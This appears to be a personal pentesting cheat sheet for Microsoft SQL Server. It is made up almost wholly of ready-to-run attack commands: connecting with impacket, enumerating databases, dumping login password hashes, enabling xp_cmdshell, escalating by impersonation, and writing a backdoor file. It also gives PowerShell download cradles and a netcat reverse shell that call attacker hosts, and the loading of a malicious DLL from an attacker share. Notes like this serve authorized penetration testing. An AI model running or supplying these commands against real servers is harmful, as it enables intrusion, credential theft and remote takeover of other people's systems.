---
title: MSSQL
updated: 2025-05-12 06:23:40Z
created: 2025-04-19 12:07:07Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## Tools for MSSQL Pentesting
**impacket-mssqlclient.py** – Auth + command execution
**PowerUpSQL** – AD + MSSQL post-exploitation
**nmap** --script ms-sql-*
**sqlcmd** – native tool for querying
**Metasploit** – auxiliary/admin/mssql/*

Connect to MSSQL server using **impacket**
Note: Force **NTLM** authentication instead of Kerberos:
`impacket-mssqlclient <user>:<password>@<target_IP> -windows-auth;`
* * *
## Version & User info
`SELECT @@version;` -- SQL Server version
`SELECT SYSTEM_USER;` -- Connected SQL user
`SELECT IS_SRVROLEMEMBER('sysadmin');` -- Check if user is sysadmin
`SELECT USER_NAME();` -- Current DB user
`SELECT USER;` -- Same as above
* * *
## Database Enumeration
`SELECT name FROM master..sysdatabases;` -- List databases
`SELECT name FROM sysobjects WHERE xtype='U';` -- Tables in current DB
`SELECT table_name FROM information_schema.tables;` -- Another way
`SELECT column_name FROM information_schema.columns 
WHERE table_name = 'users';` -- Columns in table
* * *
## Credential Dumping
`SELECT name, password_hash FROM sys.sql_logins;` -- Get SQL Server login hashes (if sysadmin)
**Note**: Requires **VIEW SERVER STATE** or **sysadmin** role.
* * *

## Data Exfiltration
`SELECT TOP 5 username, password FROM users;`
* * *
## Command Execution (via `xp_cmdshell`)
`EXEC sp_configure 'show advanced options', 1; RECONFIGURE;`
`EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
`EXEC xp_cmdshell 'whoami';`
`EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://<evil>/Invoke-PowerShellTcp.ps1\")"';`
🔥 You can now run arbitrary system commands.
* * *
## Enable `xp_cmdshell` without Admin
If you're not sysadmin, try **privilege escalation**:
`EXECUTE AS USER = 'dbo';` -- or impersonate another user
`REVERT;`
Check impersonation options:
`SELECT * FROM fn_my_permissions(NULL, 'SERVER');`
`SELECT distinct grantee_principal_id FROM sys.server_permissions;`
* * *

## Discover File System (if `xp_cmdshell` is enabled)
`EXEC xp_cmdshell 'dir C:\';`
`EXEC xp_cmdshell 'type C:\Users\Public\notes.txt';`
* * *
## Upload a File to the Server
Using BCP (bulk copy):
`EXEC xp_cmdshell 'bcp "SELECT ''cmd from attacker''" queryout C:\backdoor.txt -c -T -S localhost';`
* * *

## Connect Back / Reverse Shell
If `xp_cmdshell` works

`EXEC xp_cmdshell "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"` -- PowerShell reverse shell
`EXEC xp_cmdshell "C:\nc.exe -e cmd.exe <kali> <port>"` -- NetCat reverse shell
* * *
## UDF Shell (if `xp_cmdshell` is disabled)
Use a custom DLL UDF to get command execution:
1. Upload DLL via SMB or UNC path
2. Register UDF:
`EXEC sp_addextendedproc 'xp_cmdshell_hack', '\\attacker\share\malicious.dll';`
`EXEC xp_cmdshell_hack 'cmd.exe /c whoami';`







